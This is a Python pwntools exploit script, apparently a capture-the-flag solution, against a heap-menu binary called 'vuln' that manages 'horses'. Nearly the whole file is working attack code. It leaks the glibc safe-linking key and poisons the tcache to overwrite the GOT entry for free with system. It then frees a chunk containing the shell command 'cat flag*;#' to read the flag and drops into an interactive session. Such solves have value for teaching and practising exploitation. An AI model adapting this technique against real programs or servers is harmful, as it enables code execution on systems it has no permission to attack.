#!/usr/bin/env python3
import os

from pwn import *

BIN = "./vuln"
NUM_HORSES = 12

elf = context.binary = ELF(BIN, checksec=False)


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 1337)
        return remote(host, port)
    return process(BIN)


def add_horse(io, idx, size, name):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Stable index # (0-17)? ", str(idx).encode())
    io.sendlineafter(b"Horse name length (16-256)? ", str(size).encode())
    io.sendlineafter(f"Enter a string of {size} characters: ".encode(), name)


def add_horse_nowait(io, idx, size, name):
    io.sendline(b"1")
    io.sendlineafter(b"Stable index # (0-17)? ", str(idx).encode())
    io.sendlineafter(b"Horse name length (16-256)? ", str(size).encode())
    io.sendlineafter(f"Enter a string of {size} characters: ".encode(), name)


def remove_horse(io, idx):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Stable index # (0-17)? ", str(idx).encode())


def remove_horse_nowait(io, idx):
    io.sendline(b"2")
    io.sendlineafter(b"Stable index # (0-17)? ", str(idx).encode())


def edit_horse(io, idx, data, spot):
    io.sendlineafter(b"Choice: ", b"0")
    io.sendlineafter(b"Stable index # (0-17)? ", str(idx).encode())
    io.sendlineafter(b"Enter a string of 16 characters: ", data)
    io.sendlineafter(b"New spot? ", str(spot).encode())


def edit_horse_nowait(io, idx, data, spot):
    io.sendline(b"0")
    io.sendlineafter(b"Stable index # (0-17)? ", str(idx).encode())
    io.sendlineafter(b"Enter a string of 16 characters: ", data)
    io.sendlineafter(b"New spot? ", str(spot).encode())


def race(io):
    io.sendlineafter(b"Choice: ", b"3")


def leak_key(io):
    for i in range(NUM_HORSES):
        add_horse(io, i, 256, b"\xff")

    for i in range(NUM_HORSES - 1, -1, -1):
        remove_horse(io, i)

    for i in range(NUM_HORSES):
        add_horse(io, i, 256, b"\xff")

    race(io)
    raw = io.recvuntil(b"WINNER:")

    leaks = []
    for line in raw.splitlines()[:NUM_HORSES]:
        lane = line.split(b"|")[0].strip()
        leaks.append(u64(lane.ljust(8, b"\x00")))

    if args.REMOTE:
        key = leaks[7] - 1
    else:
        key = max(value for value in leaks if 0x1000 < value < (1 << 24)) - 1

    log.info(f"safe-linking key: {key:#x}")
    return key


def exploit(io):
    key = leak_key(io)

    if args.REMOTE:
        log.info("free horse 6")
        remove_horse_nowait(io, 6)
        log.info("free horse 7")
        remove_horse_nowait(io, 7)
        edit_idx = 7
    else:
        log.info("free horse 5")
        remove_horse_nowait(io, 5)
        log.info("free horse 6")
        remove_horse_nowait(io, 6)
        edit_idx = 6

    target = elf.got["free"] - 8
    mangled = target ^ key
    log.info(f"poison target: {target:#x}")
    log.info(f"edit horse {edit_idx}")
    edit_horse_nowait(io, edit_idx, p64(mangled) + b"\xff", 0)

    log.info("allocate command chunk")
    add_horse_nowait(io, 15, 16, b"cat flag*;#aaaaa")
    log.info("allocate poisoned chunk")
    add_horse_nowait(io, 16, 256, p64(elf.plt["system"]) * 2 + b"\xff")
    log.info("trigger free -> system")
    remove_horse_nowait(io, 15)

    io.interactive()


if __name__ == "__main__":
    io = start()
    exploit(io)
